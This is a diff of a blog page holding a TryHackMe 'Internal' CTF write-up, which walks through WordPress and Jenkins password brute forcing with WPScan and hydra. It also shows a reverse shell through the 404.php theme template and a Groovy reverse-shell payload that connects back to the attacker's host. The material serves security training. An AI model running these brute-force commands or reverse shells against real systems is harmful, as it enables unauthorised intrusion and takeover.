@@ -11,7 +11,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <meta
   name="description"
-  content="Link Level Creator     Here Medium user    Reconn ╰─ lanfran@parrot ❯ map 10.10.170.6 ─╯ [sudo] password for lanfran: Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-09 10:53 CEST Nmap scan report for 10.10.170.6 Host is up (0.082s latency). Not shown: 990 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA) | 256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA) |_ 256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519) 80/tcp open http Apache httpd 2."
+  content="Link Level Creator     Here Hard TheMayor    Reconn We won&amp;rsquo;t start by doing anything new, just an nmap to the machine.
+╰─ lanfran@parrot ❯ map 10.10.170.6 ─╯ [sudo] password for lanfran: Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-09 10:53 CEST Nmap scan report for 10.10.170.6 Host is up (0.082s latency). Not shown: 990 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7."
 />
 <meta
   name="keywords"
@@ -45,16 +46,18 @@
 <link href="/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
 
 
-<meta name="twitter:card" content="summary"/>
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/posts/internal/cover.jpeg"/>
 <meta name="twitter:title" content="Internal - Write Up"/>
-<meta name="twitter:description" content="TryHackMe&#39;s medium level machine."/>
+<meta name="twitter:description" content="TryHackMe&#39;s Hard level machine."/>
 
 
 
 <meta property="og:title" content="Internal - Write Up" />
-<meta property="og:description" content="TryHackMe&#39;s medium level machine." />
+<meta property="og:description" content="TryHackMe&#39;s Hard level machine." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="/posts/internal/" />
+<meta property="og:image" content="/posts/internal/cover.jpeg"/>
 <meta property="article:published_time" content="2021-07-09T10:52:31+02:00" />
 <meta property="article:modified_time" content="2021-07-09T10:52:31+02:00" /><meta property="og:site_name" content="Lanfran02 - Blog" />
 
@@ -226,13 +229,25 @@ if (!doNotTrack) {
 
       
         <span class="post-read-time"
-          >— 7 min read</span
+          >— 8 min read</span
         >
       
     </div>
 
     
       <span class="post-tags">
+        
+          <a href="/tags/gobuster/">#gobuster</a>&nbsp;
+        
+          <a href="/tags/wpscan/">#WPScan</a>&nbsp;
+        
+          <a href="/tags/nc/">#nc</a>&nbsp;
+        
+          <a href="/tags/jenkins/">#jenkins</a>&nbsp;
+        
+          <a href="/tags/docker/">#docker</a>&nbsp;
+        
+          <a href="/tags/hydra/">#hydra</a>&nbsp;
         
           <a href="/tags/tryhackme/">#TryHackMe</a>&nbsp;
         
@@ -272,15 +287,14 @@ if (!doNotTrack) {
 </thead>
 <tbody>
 <tr>
-<td><a href="https://tryhackme.com/room/">Here</a></td>
-<td>Medium</td>
-<td><a href="https://tryhackme.com/p/">user</a></td>
+<td><a href="https://tryhackme.com/room/internal">Here</a></td>
+<td>Hard</td>
+<td><a href="https://tryhackme.com/p/TheMayor">TheMayor</a></td>
 </tr>
 </tbody>
 </table>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
 <h2 id="reconn">Reconn</h2>
+<p>We won&rsquo;t start by doing anything new, just an <code>nmap</code> to the machine.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ map 10.10.170.6                                                                                                ─╯
 <span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> lanfran: 
 Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-07-09 10:53 CEST
@@ -308,7 +322,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 34.25 seconds
-</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ scan 10.10.170.6                                                                                               ─╯
+</code></pre></div><p>Let&rsquo;s see if we can find a hidden folder or endpoint with <code>gobuster</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ scan 10.10.170.6                                                                                               ─╯
 <span style="color:#f92672">===============================================================</span>
 Gobuster v3.0.1
 by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@_FireFart_<span style="color:#f92672">)</span>
@@ -334,8 +349,11 @@ by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:
 <span style="color:#f92672">===============================================================</span>
 2021/07/09 10:53:40 Finished
 <span style="color:#f92672">===============================================================</span>
-</code></pre></div><p><code>href=&quot;http://internal.thm/blog/index.php/feed/&quot; /&gt;</code></p>
-<p>let&rsquo;s add the new domain to <code>/etc/hosts</code></p>
+</code></pre></div><p>Well, we found two interesting endpoints, <code>/blog</code> and <code>/wordpress</code>.</p>
+<p>Navigating towards them, we find in the source code, what would be an HTML label that refers to the virtual domain of the machine.</p>
+<p><code>href =&quot; http: //internal.thm/blog/index.php/feed/ &quot;/&gt;</code></p>
+<p>So let&rsquo;s add the new domain to <code>/etc/hosts</code></p>
+<p>Since <code>/blog</code> has a <code>wordpress</code> behind it, let&rsquo;s run <code>WPScan</code> to get more information.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ wpscan -e vp,vt,cb,u --url http://internal.thm/blog/                                                           ─╯
 _______________________________________________________________
          __          _______   _____
@@ -372,7 +390,9 @@ _______________________________________________________________
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Data Received: 538.97 KB
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Memory used: 219.34 MB
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Elapsed time: 00:00:18
-</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt                             ─╯
+</code></pre></div><p>Returns interesting information, found an user: <code>admin</code>.</p>
+<p>Let&rsquo;s see if we can brute force the WordPress login with that user&hellip;</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt                             ─╯
 _______________________________________________________________
          __          _______   _____
          <span style="color:#ae81ff">\ \ </span>       / /  __ <span style="color:#ae81ff">\ </span>/ ____|
@@ -405,11 +425,11 @@ Trying admin / bratz1 Time: 00:02:40 &lt;                                       
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Data Received: 2.31 MB
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Memory used: 237.906 MB
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Elapsed time: 00:02:51
-</code></pre></div><p>Wp Admin password found.</p>
+</code></pre></div><p>Cool!</p>
+<p>Now we have access to the admin panel of wordpress!</p>
 <h2 id="foothold---user">Foothold - User</h2>
-<p>Login in to WP-Admin we get our rev shell using the 404.php template.</p>
-<p><code>http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php</code></p>
-<p>We uploaded our shell there.</p>
+<p>Logging into WP-Admin, we can get a reverse shell using the 404.php template from the twentyseventeen theme.</p>
+<p>And then we navigate to <code>http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php</code> to get the connection!</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ nc -nlvp <span style="color:#ae81ff">1337</span>                                                                                                                                  ─╯
 listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">1337</span> ...
 connect to <span style="color:#f92672">[</span>10.9.1.222<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.170.6<span style="color:#f92672">]</span> <span style="color:#ae81ff">48948</span>
@@ -419,7 +439,8 @@ www-data@internal:/var/www/html/wordpress/wp-content/themes/twentyseventeen$ id
 uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
 www-data@internal:/var/www/html/wordpress/wp-content/themes/twentyseventeen$ whoami
 www-data
-</code></pre></div><p>We found a file, saving the password and user of aubreanna</p>
+</code></pre></div><p>We made a breakthrough, we already have one foot in the machine.</p>
+<p>Looking through the files on the machine, we found a file containing the username and password of aubreanna!</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@internal:/opt$ ls -la
 total <span style="color:#ae81ff">16</span>
 drwxr-xr-x  <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Aug  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">2020</span> .
@@ -437,11 +458,15 @@ Password: <span style="color:#f92672">[</span>REDACTED<span style="color:#f92672
 
 aubreanna@internal:/opt$ cat /home/aubreanna/user.txt 
 <span style="color:#f92672">[</span>REDACTED<span style="color:#f92672">]</span>
-</code></pre></div><h2 id="root">Root</h2>
+</code></pre></div><p>We can log in with <code>su</code> and read the user flag.</p>
+<h2 id="root">Root</h2>
+<p>In the <code>home</code> directory of <code>aubreanna</code> there is a note, let&rsquo;s read it</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">aubreanna@internal:~$ cat jenkins.txt 
 Internal Jenkins service is running on 172.17.0.2:8080
 aubreanna@internal:~$
-</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ ssh -L 8080:172.17.0.2:8080 aubreanna@internal.thm                                                             ─╯
+</code></pre></div><p>Hmm, there&rsquo;s a Jenkins service running &hellip;</p>
+<p>Since we have the credentials of this user, let&rsquo;s forward that port to us for being able to access it from our PC.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ ssh -L 8080:172.17.0.2:8080 aubreanna@internal.thm                                                             ─╯
 The authenticity of host <span style="color:#e6db74">&#39;internal.thm (10.10.170.6)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
 </span><span style="color:#e6db74">ECDSA key fingerprint is SHA256:fJ/BlTrDF8wS8/eqyoej1aq/NmvQh79ABdkpiiN5tqE.
 </span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
@@ -473,7 +498,8 @@ Welcome to Ubuntu 18.04.4 LTS <span style="color:#f92672">(</span>GNU/Linux 4.15
 
 Last login: Mon Aug  <span style="color:#ae81ff">3</span> 19:56:19 <span style="color:#ae81ff">2020</span> from 10.6.2.56
 aubreanna@internal:~$
-</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ hydra 127.0.0.1 -s <span style="color:#ae81ff">8080</span> -f http-form-post <span style="color:#e6db74">&#34;/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in&amp;Login=Login:Invalid username or password&#34;</span> -l admin -P /usr/share/wordlists/rockyou.txt 
+</code></pre></div><p>Hmm, if we now go to <code>127.0.0.1:8080</code> we will see the jenkins page requesting credentials, let&rsquo;s use <code>hydra</code> to brute force it.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ hydra 127.0.0.1 -s <span style="color:#ae81ff">8080</span> -f http-form-post <span style="color:#e6db74">&#34;/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in&amp;Login=Login:Invalid username or password&#34;</span> -l admin -P /usr/share/wordlists/rockyou.txt 
 Hydra v9.1 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2020</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.
 
 Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2021-07-09 11:41:41
@@ -485,9 +511,9 @@ Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-h
 <span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target successfully completed, <span style="color:#ae81ff">1</span> valid password found
 Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> finished at 2021-07-09 11:42:07
 
-</code></pre></div><p><code>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy</code></p>
-<p>we get the reverse shell,</p>
-<p><code>http://127.0.0.1:8080/script</code></p>
+</code></pre></div><p>Yes!! We get the username and password to be able to log in.</p>
+<p>At the address <code>http://127.0.0.1:8080/script</code> we can execute a script!</p>
+<p>I will use a reverse shell of the repository <a href="%60https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy%60">PayloadsAllTheThings</a>:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">String host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;10.9.1.222&#34;</span><span style="color:#f92672">;</span>
 <span style="color:#66d9ef">int</span> port<span style="color:#f92672">=</span>1337<span style="color:#f92672">;</span>
 String cmd<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/bin/bash&#34;</span><span style="color:#f92672">;</span>
@@ -512,7 +538,9 @@ Will wanted these credentials secured behind the Jenkins container since we have
 need access to the root user account.
 
 root:<span style="color:#f92672">[</span>REDACTED<span style="color:#f92672">]</span>
-</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ ssh -L 8080:172.17.0.2:8080 root@internal.thm                                                                                                  ─╯
+</code></pre></div><p>YES! Reverse shell like <code>jenkins</code>!</p>
+<p>Looking through the directories again, I found the password for <code>root</code>!!</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╰─ lanfran@parrot ❯ ssh -L 8080:172.17.0.2:8080 root@internal.thm                                                                                                  ─╯
 root@internal.thm<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
 Welcome to Ubuntu 18.04.4 LTS <span style="color:#f92672">(</span>GNU/Linux 4.15.0-112-generic x86_64<span style="color:#f92672">)</span>
 
@@ -543,7 +571,9 @@ Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your 
 Last login: Mon Aug  <span style="color:#ae81ff">3</span> 19:59:17 <span style="color:#ae81ff">2020</span> from 10.6.2.56
 root@internal:~# cat root.txt 
 <span style="color:#f92672">[</span>REDACTED<span style="color:#f92672">]</span>
-</code></pre></div>
+</code></pre></div><p>And we rooted the machine!</p>
+<p>That&rsquo;s all from my side, hope you find this helpful!</p>
+
     </div>
     
       
